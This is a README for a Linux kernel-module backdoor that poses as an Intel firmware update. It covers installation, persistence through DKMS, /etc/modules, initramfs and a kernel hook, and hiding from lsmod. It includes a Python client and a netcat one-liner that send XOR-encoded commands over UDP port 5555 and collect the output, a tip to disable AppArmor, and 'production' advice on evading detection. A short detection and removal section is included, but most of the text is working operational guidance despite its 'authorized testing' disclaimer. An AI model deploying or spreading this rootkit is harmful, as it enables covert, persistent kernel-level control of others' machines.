# Linux Kernel Module C2 Shell - Installation & Usage Guide

---

## Overview

This is a Linux kernel module-based command and control shell that:
- Intercepts network packets at the kernel level via netfilter hooks
- Listens on **UDP port 5555** for incoming commands
- Executes commands via `call_usermodehelper()`
- Captures and returns command output
- Hides itself from the kernel module list
- Runs with **kernel-level privileges** (highest access)

---

## Prerequisites

- **Linux kernel headers** (matching your kernel version)
- **GCC compiler** with kernel build tools
- **Make** utility
- **Root/sudo access** for compilation and installation
- **Linux 4.0+** (for netfilter hooks API compatibility)

### Install Prerequisites

**Ubuntu/Debian:**
```bash
sudo apt-get update
sudo apt-get install build-essential linux-headers-$(uname -r) dkms wget
```

**CentOS/RHEL:**
```bash
sudo yum groupinstall "Development Tools"
sudo yum install kernel-devel-$(uname -r) dkms
```

**Fedora:**
```bash
sudo dnf groupinstall "Development Tools"
sudo dnf install kernel-devel-$(uname -r) dkms
```

---

## COMPILATION

### Prerequisites Check

```bash
# Verify kernel headers are installed
ls /lib/modules/$(uname -r)/build

# If missing, install them:
sudo apt-get update
sudo apt-get install linux-headers-$(uname -r) build-essential dkms
```

### Build the Module

**Note:** Manual compilation is not required - the `install.sh` script uses DKMS for automatic building. However, for manual testing:

```bash
cd linux-(tested)

# Compile the kernel module
make

# Verify compilation succeeded
file intel_fw_update.ko
# Expected: ELF 64-bit LSB relocatable module...

# Clean (if needed)
make clean
```

The provided Makefile handles all compilation details. DKMS will manage builds automatically for kernel updates.

---

## INSTALLATION

### Quick Installation (Automated with DKMS)

The easiest way is to use the provided install script with DKMS for automatic kernel compatibility:

```bash
cd linux-(tested)

# Run the installer (handles DKMS setup, persistence, etc.)
sudo ./install.sh
```

The script will:
- ✓ Install DKMS and build tools if needed
- ✓ Copy source to `/usr/local/.intel_fw_update/src/` (hidden)
- ✓ Set up DKMS tree in `/usr/src/intel_fw_update-1.1/`
- ✓ Add module to DKMS
- ✓ Build and install for current kernel
- ✓ Add to `/etc/modules` for autoload
- ✓ Update initramfs for early boot loading
- ✓ Create kernel update hook as backup
- ✓ Update module dependencies with depmod
- ✓ Load the module immediately

**DKMS Benefits:**
- Automatically rebuilds for new kernel versions
- No manual recompilation needed after updates
- Handles kernel ABI changes seamlessly

### Verify Installation

After running the install script, verify it's working:

```bash
# Check if module is loaded (note: it hides from lsmod)
sudo dkms status intel_fw_update

# Check listening port
sudo netstat -ulnp | grep 5555

# Check DKMS source
ls -la /usr/src/intel_fw_update-1.1/
# Hidden backup
ls -la /usr/local/.intel_fw_update/src/

# Check module installation directory
ls -la /lib/modules/$(uname -r)/updates/firmware-intel/

# Check kernel hook
ls -la /etc/kernel/postinst.d/ | grep intel
```

---

## PERSISTENT INSTALLATION

The `install.sh` script handles all persistence setup automatically using DKMS. Simply run:

```bash
cd linux-(tested)
sudo ./install.sh
```

### What the Install Script Does

The script sets up **multiple persistence mechanisms** to ensure the module survives reboots and kernel updates:

**1. DKMS Integration** ⭐ (Primary)
- Registers module with DKMS for automatic rebuilding
- Source stored in `/usr/src/intel_fw_update-1.1/` (standard DKMS location)
- Backup copy in `/usr/local/.intel_fw_update/src/` (hidden)
- Builds and installs for current and future kernels
- **Automatically handles kernel updates** - no manual intervention needed

**2. `/etc/modules` Autoload**
- Adds `intel_fw_update` to `/etc/modules` for boot-time loading
- Module loads before most network services start

**3. Initramfs Integration**
- Updates initial RAM filesystem (`update-initramfs`)
- Module available early in boot process

**4. Kernel Update Hook** (Backup)
- Creates `/etc/kernel/postinst.d/install_intel_fw_update_module` hook script
- Provides additional persistence if DKMS fails
- Survives `apt full-upgrade` and kernel patches

**5. Depmod Integration**
- Updates module dependencies with `depmod`
- Kernel automatically detects and loads module

### DKMS Management

After installation, you can manage the module with DKMS:

```bash
# Check status
sudo dkms status intel_fw_update

# Rebuild for current kernel
sudo dkms build intel_fw_update/1.1

# Reinstall
sudo dkms install intel_fw_update/1.1

# Remove from DKMS
sudo dkms remove intel_fw_update/1.1 --all
```

### Manual Setup (If Needed)

If you need to run parts manually (not recommended - use the script):

```bash
# Install DKMS
sudo apt install dkms

# Copy source to both locations
sudo mkdir -p /usr/src/intel_fw_update-1.1
sudo cp Makefile intel_fw_update.c dkms.conf /usr/src/intel_fw_update-1.1/
sudo mkdir -p /usr/local/.intel_fw_update/src
sudo cp Makefile intel_fw_update.c /usr/local/.intel_fw_update/src/

# Add to DKMS
sudo dkms add intel_fw_update/1.1

# Build and install
sudo dkms build intel_fw_update/1.1
sudo dkms install intel_fw_update/1.1

# Add to autoload
echo "intel_fw_update" | sudo tee -a /etc/modules

# Update initramfs
sudo update-initramfs -u

# Load module
sudo modprobe intel_fw_update
```

---

## CLIENT COMMUNICATION

### Connect to the Shell

The module listens for UDP packets on **port 5555** with this format:

**Packet Structure:**
```
[MAGIC_HEADER: "INTLUPD:"][XOR-encoded command]
```

### Example Client (Python)

```python
import socket

def xor_encode(data, key=0x55):
    """XOR encode data with key"""
    return bytes([b ^ key for b in data])

def send_command(target_ip, command):
    """Send command to C2 shell and receive output"""
    
    # Prepare payload
    magic_header = b"INTLUPD:"
    encoded_cmd = xor_encode(command.encode())
    payload = magic_header + encoded_cmd
    
    # Send via UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(payload, (target_ip, 5555))
    
    # Receive output
    try:
        sock.settimeout(5)
        output, _ = sock.recvfrom(4096)
        return output.decode('utf-8', errors='ignore')
    except socket.timeout:
        return "No response"
    finally:
        sock.close()

# Usage
if __name__ == "__main__":
    target = "192.168.1.100"
    commands = ["id", "whoami", "uname -a", "cat /etc/passwd"]
    
    for cmd in commands:
        print(f"[*] Sending: {cmd}")
        response = send_command(target, cmd)
        print(f"[+] Response:\n{response}\n")
```

### Available Commands

Any command available in the shell:
- `id` - current user/uid info
- `whoami` - current username
- `uname -a` - kernel/system info
- `cat /etc/passwd` - user list
- `ps aux` - running processes
- `ip a` or `ifconfig` - network config
- `ls -la /root` - directory listing

---

## DETECTION & REMOVAL

### What Could Give It Away

- **Netstat/ss:** Listening UDP port 5555 (non-standard port)
- **lsmod:** Module name `intel_fw_update` is suspicious
- **dmesg:** Kernel messages during load
- **Network monitoring:** UDP traffic to port 5555 with `INTLUPD:` header
- **eBPF/auditd:** Trace process execution from kernel
- **Packet capture:** Distinctive XOR-encoded payload pattern

### Detection Commands

```bash
# Check for suspicious listening ports
sudo netstat -ulnp | grep -v known_service

# List all loaded kernel modules
lsmod

# Check kernel messages for module activity
dmesg | grep intel_fw_update

# Monitor system calls in real-time
sudo strace -e trace=execve -p $(pgrep -f cmdname)

# Packet capture on port 5555
sudo tcpdump -i any udp port 5555 -A

# Check for iptables/netfilter rules
sudo iptables -L -n

# View active netfilter hooks
sudo cat /proc/net/nf_hooks_ipv4
```

### Removal

**Complete cleanup** (removes all persistence):

```bash
# Unload the module
sudo modprobe -r intel_fw_update

# Remove from autoload
sudo sed -i '/^intel_fw_update$/d' /etc/modules

# Remove from kernel updates directory
sudo rm -f /lib/modules/*/updates/firmware-intel/intel_fw_update.ko

# Remove kernel update hook
sudo rm -f /etc/kernel/postinst.d/install_intel_fw_update_module

# Remove hidden module storage
sudo rm -rf /usr/local/.intel_fw_update/

# Rebuild initramfs
sudo update-initramfs -u

# Rebuild depmod
sudo depmod -a

# Verify removal
lsmod | grep intel_fw_update  # Should show nothing
sudo netstat -ulnp | grep 5555  # Should show nothing
```

---

## TROUBLESHOOTING

### Installation Script Fails

```bash
# Ensure you have sudo access
sudo -v

# Check if .ko file exists
ls -la intel_fw_update.ko

# Run with verbose output
sudo bash -x ./install.sh 2>&1 | tail -50

# Common issues:
# - Not in the linux-(tested) directory
# - .ko not compiled yet (run `make` first)
# - Insufficient disk space in /lib/modules
```

### Module Won't Load After Reboot

```bash
# Check if module is in kernel modules directory
ls /lib/modules/$(uname -r)/updates/firmware-intel/

# Check if listed in /etc/modules
cat /etc/modules | grep intel_fw_update

# Check if initramfs is updated
sudo update-initramfs -u

# Reload module manually
sudo modprobe intel_fw_update

# Check dmesg for errors
dmesg | grep -i intel
```

### Port Not Listening

```bash
# Verify module is actually loaded
sudo lsmod | grep intel_fw_update

# Check netfilter hooks
sudo cat /proc/net/nf_hooks_ipv4

# Test with manual load
sudo modprobe -r intel_fw_update
sudo modprobe intel_fw_update
sudo netstat -ulnp | grep 5555
```

### Kernel Update Broke Module

The kernel update hook should handle this automatically, but if not:

```bash
# Check the hook exists
ls -la /etc/kernel/postinst.d/install_intel_fw_update_module

# Manually rebuild after kernel update
cd linux-(tested)
make clean
make
sudo ./install.sh
```

### Commands Not Executing

```bash
# Check if SELinux/AppArmor is blocking
sudo getenforce  # For SELinux
sudo aa-status   # For AppArmor

# Disable AppArmor (if causing issues)
sudo systemctl stop apparmor

# Check audit logs
sudo ausearch -k module_exec

# Test with simple command
python3 client.py 192.168.1.X "id"
```

---

## ADVANCED CUSTOMIZATION

### Change Listen Port

Edit `intel_fw_update.c`:
```c
#define LISTEN_PORT 5555  // Change to desired port
```

Recompile:
```bash
make clean
make
```

### Change Magic Header

Edit `intel_fw_update.c`:
```c
#define MAGIC_HEADER "INTLUPD:"  // Change header
#define MAGIC_LEN 8              // Update length
```

### Change XOR Key

Edit `intel_fw_update.c`:
```c
#define XOR_KEY 0x55  // Change encryption key
```

Then recompile and reinstall.

### Use Netcat as Test Client

```bash
# Create test payload (with magic header + command)
# Command: "id"
# XOR encoded with 0x55: i(0x69)^0x55=0x3C, d(0x64)^0x55=0x31

echo -ne "INTLUPD:\x3c\x31" | nc -u TARGET_IP 5555
```

---

## SECURITY NOTES

⚠️ **This tool is for authorized testing/red team operations only.**

- **UDP unencrypted:** Anyone on the network can see packets
- **XOR is weak:** Easy to reverse-engineer the payload
- **Port 5555 stands out:** Not a standard service port
- **Module name is obvious:** Name contains "intel" which looks suspicious
- **Kernel logs exposure:** Dmesg will show module load messages
- **No output encryption:** Command output sent in plaintext

### Recommendations for Production Use

1. **Use port 53 (DNS) or 443 (HTTPS)** to blend with legitimate traffic
2. **Implement real encryption** (AES-256-GCM instead of XOR)
3. **Randomize magic header** per payload
4. **Change port/header dynamically** based on timestamp
5. **Hide module name** using proper kernel rootkit techniques
6. **Filter dmesg output** to prevent logging
7. **Use legitimate-looking network traffic patterns**

---

## FILE STRUCTURE

```
linux-(tested)/
├── intel_fw_update.c           # Kernel module source
├── Makefile                     # Build configuration
├── README.md                    # This file
└── Module.symvers              # Generated during compilation
```

---

## REFERENCES

- Netfilter Documentation: https://www.netfilter.org/
- Linux Kernel Modules: https://www.kernel.org/doc/html/latest/admin-guide/modules.html
- UDP Socket Programming: https://man7.org/linux/man-pages/man7/udp.7.html
